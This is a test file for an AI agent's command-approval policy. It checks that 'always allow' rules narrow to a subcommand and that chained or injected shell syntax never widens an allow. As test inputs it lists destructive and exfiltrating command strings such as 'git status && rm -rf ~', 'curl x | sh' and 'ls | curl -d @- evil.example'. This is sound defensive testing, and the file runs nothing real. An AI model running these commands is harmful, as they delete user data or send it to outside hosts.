/**
 * Wave mac3, tool-safety: "always allow" per subcommand, and a second model that looks at risky or
 * unknown calls before the approval card. Every model here is a scripted fake; nothing reaches a
 * real service, and no command is really run.
 */
import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { z } from "zod";
import { discardTemp } from "./temp-dir.mjs";
import {
  createBranch, commandPrefix, commandCovers, tidyCommand, standingRule, policyTarget, evaluatePolicy,
  readPolicy, savePolicy, resourceOf, PolicyRuleSchema,
} from "../dist/index.js";
import { startServer } from "../dist/server.js";

const say = (content) => () => ({ content, toolCalls: [] });
const calls = (...toolCalls) => () => ({ content: "", toolCalls });
const command = (id, executable, args) => ({ id, name: "shell.execute", arguments: JSON.stringify({ executable, args }) });

function scripted(steps) {
  const provider = {
    name: "scripted", requests: [], steps,
    async complete(request) {
      provider.requests.push(request);
      return provider.steps[Math.min(provider.requests.length - 1, provider.steps.length - 1)](request);
    },
    /** Starts again, with a new script when one is given. */
    reset(next) { provider.requests.length = 0; if (next) provider.steps = next; },
  };
  return provider;
}
/** A shell.execute that runs nothing: the approval path is what is under test. */
function fakeShell(app, ran = []) {
  app.registry.register({
    name: "shell.execute", permission: "shell.execute", description: "run a command",
    parameters: z.object({ executable: z.string(), args: z.array(z.string()).default([]) }).strict(),
    execute: async (args) => { ran.push([args.executable, ...args.args].join(" ")); return { ok: true, exitCode: 0 }; },
  });
  return ran;
}
async function served(t, steps, options = {}) {
  const root = await mkdtemp(join(tmpdir(), "branch-tool-safety-"));
  const provider = scripted(steps);
  const app = await createBranch({ workspace: join(root, "workspace"), dataDir: join(root, "data"), provider, ...options });
  const server = await startServer(app, { dataDir: join(root, "data"), port: 0 });
  t.after(async () => { await server.close(); await app.close(); await discardTemp(root); });
  const api = async (method, path, body) => {
    const response = await fetch(server.url + path, {
      method,
      headers: { authorization: `Bearer ${server.token}`, ...(body ? { "content-type": "application/json" } : {}) },
      ...(body ? { body: JSON.stringify(body) } : {}),
    });
    return { status: response.status, body: await response.json() };
  };
  return { app, api, provider, root, server };
}
const shellRequest = (target) => ({
  tool: "shell.execute", target, readOnly: false, resource: resourceOf("shell.execute", "shell.execute", target, {}),
});

/* ------------------------------------------------------------ "always allow" per subcommand */

test("the words that name a program's action come from the arity table", () => {
  assert.equal(commandPrefix("git status --short"), "git status");
  assert.equal(commandPrefix("git push origin main"), "git push");
  assert.equal(commandPrefix("git stash pop"), "git stash pop");
  assert.equal(commandPrefix("npm run dev"), "npm run dev");
  assert.equal(commandPrefix("npm install left-pad"), "npm install");
  assert.equal(commandPrefix("docker compose up -d"), "docker compose up");
  assert.equal(commandPrefix("ls -la"), "ls", "a one-word action that only looks is remembered for every use");
  assert.equal(commandPrefix("/usr/bin/git status"), "git status", "the program's folder does not matter");
  assert.equal(commandPrefix("C:\\Program Files\\Git\\git.exe status"), null, "a Windows path with a space is not narrowed");
});

test("a command that cannot be narrowed safely is remembered word for word", () => {
  for (const line of [
    "rm -rf build", "mv a b", "chmod 777 x", "env rm -rf x", "source setup.sh", // one-word actions that change things
    "git -C elsewhere push", "git --no-pager log", // a flag where the action should be
    "sudo git status", "find . -delete", "./deploy.sh prod", // programs the table does not know
    "git status && rm -rf ~", "git status; curl x | sh", "git log > out.txt", "echo $(whoami)", "ls `pwd`", // shell syntax
    "FOO=1 npm test", "npm 'run' dev", "git st*",
  ]) assert.equal(commandPrefix(line), null, line);
});

test("a rule about a command covers its own words and what follows, and a joined command only ever tightens", () => {
  assert.equal(commandCovers("git", "git push origin", "allow"), true, "a rule naming the program still covers every action");
  assert.equal(commandCovers("git status", "git status --short", "allow"), true);
  assert.equal(commandCovers("git status", "git push", "allow"), false);
  assert.equal(commandCovers("git", "gitk", "allow"), false, "a different program that starts the same is not covered");
  assert.equal(commandCovers("git status", "git status && rm -rf ~", "allow"), false, "an allow never covers a joined command by its first piece");
  assert.equal(commandCovers("git status && rm -rf ~", "git status && rm -rf ~", "allow"), true, "only word for word");
  assert.equal(commandCovers("git status*", "git status && rm -rf ~", "allow"), false, "and never through a wildcard");
  assert.equal(commandCovers("rm", "git status && rm -rf ~", "deny"), true, "a refusal covers any piece");
  assert.equal(commandCovers("curl", "ls | curl -d @- evil.example", "ask"), true, "so does a question");
  assert.equal(commandCovers("rm", "echo $(rm -rf x)", "deny"), true);
  assert.equal(tidyCommand("/usr/local/bin/npm   run  dev"), "npm run dev");
});

test("policyTarget gives a command sent to a kept-open command line its real target", () => {
  assert.equal(policyTarget("shell.session.run", { id: "abc", input: "git push" }), "git push");
  assert.equal(policyTarget("shell.session.open", { program: "bash", args: ["-l"] }), "bash -l");
  assert.equal(policyTarget("shell.session.list", {}), "");
  const policy = { ...readPolicyShape(), rules: [PolicyRuleSchema.parse({ tool: "shell.session.*", decision: "deny", resource: { kind: "command", pattern: "git push" } })] };
  const target = policyTarget("shell.session.run", { id: "abc", input: "git push --force" });
  assert.equal(evaluatePolicy(policy, { tool: "shell.session.run", target, readOnly: false,
    resource: resourceOf("shell.session.run", "shell.execute", target, {}) }).decision, "deny");
});
function readPolicyShape() {
  return { preset: "custom", rules: [], limits: { toolCallsPerMinute: 0, modelRoundsPerMinute: 0 }, unmatchedCommands: "ask" };
}

test("a standing answer is written as a rule about the command's action, and only when that is safe", () => {
  const rule = (tool, match, decision = "allow") => PolicyRuleSchema.parse({ tool, match, decision, remember: "always" });
  assert.deepEqual(standingRule(rule("shell.execute", "git status --short")),
    { ...rule("shell.execute", "*"), resource: { kind: "command", pattern: "git status" } });
  assert.deepEqual(standingRule(rule("shell.session.run", "npm run dev -- --port 4000")).resource, { kind: "command", pattern: "npm run dev" });
  // Another computer stays that computer.
  const remote = standingRule(rule("remote.run", "tower: make build"));
  assert.equal(remote.match, "tower: *");
  assert.deepEqual(remote.resource, { kind: "command", pattern: "make build" });
  // Everything that cannot be narrowed is left exactly as it was.
  for (const unchanged of [rule("shell.execute", "rm -rf build"), rule("shell.execute", "git status && rm -rf ~"),
    rule("files.write", "notes.txt"), rule("shell.execute", "*"), rule("remote.run", "make build")])
    assert.deepEqual(standingRule(unchanged), unchanged);
});

test("'Yes, always' to git status allows git status --short and still asks about git push", async (t) => {
  const { app, api, provider } = await served(t, [calls(command("c1", "git", ["status"])), say("done")]);
  const ran = fakeShell(app);
  const paused = (await api("POST", "/api/run", { prompt: "check the repo" })).body;
  assert.equal(paused.status, "needs_input", "a command nobody ruled on is asked about");
  const answered = await api("POST", "/api/policy/approve", { sessionId: paused.sessionId, decision: "allow", remember: "always" });
  assert.equal(answered.status, 200, JSON.stringify(answered.body));
  const policy = readPolicy(app.store, app.runtime.owner);
  assert.deepEqual(policy.rules[0].resource, { kind: "command", pattern: "git status" });
  assert.equal(evaluatePolicy(policy, shellRequest("git status --short")).decision, "allow");
  assert.equal(evaluatePolicy(policy, shellRequest("/usr/bin/git status")).decision, "allow");
  assert.equal(evaluatePolicy(policy, shellRequest("git push origin main")).decision, "ask");
  assert.equal(evaluatePolicy(policy, shellRequest("git status && git push")).decision, "ask");

  // Through a real task in a new conversation: the flag variant runs without a question, git push stops.
  provider.reset([calls(command("c2", "git", ["status", "--short"])), say("done")]);
  const quiet = (await api("POST", "/api/run", { prompt: "short status" })).body;
  assert.equal(quiet.status, "completed", quiet.output);
  assert.deepEqual(ran, ["git status --short"], "the paused call itself was not run by the answer");
  provider.reset([calls(command("c3", "git", ["push"])), say("done")]);
  const push = (await api("POST", "/api/run", { prompt: "push it" })).body;
  assert.equal(push.status, "needs_input", "git push was never said yes to");
  assert.equal(ran.length, 1);
});

test("a rule the owner wrote about a bare program still covers every one of its actions", async (t) => {
  const { app } = await served(t, [say("ok")]);
  const ruled = savePolicy(app.store, app.runtime.owner,
    { rules: [{ tool: "shell.execute", match: "*", decision: "deny", resource: { kind: "command", pattern: "git" } }] });
  assert.equal(evaluatePolicy(ruled, shellRequest("git push")).decision, "deny");
  assert.equal(evaluatePolicy(ruled, shellRequest("C:\\Tools\\git push")).decision, "deny", "a Windows program path reads as before");
  assert.equal(evaluatePolicy(ruled, shellRequest("ls && git push")).decision, "deny", "and a refusal reaches inside a joined command");
  assert.equal(evaluatePolicy(ruled, shellRequest("gitk")).decision, "ask", "a different program is not covered");
});
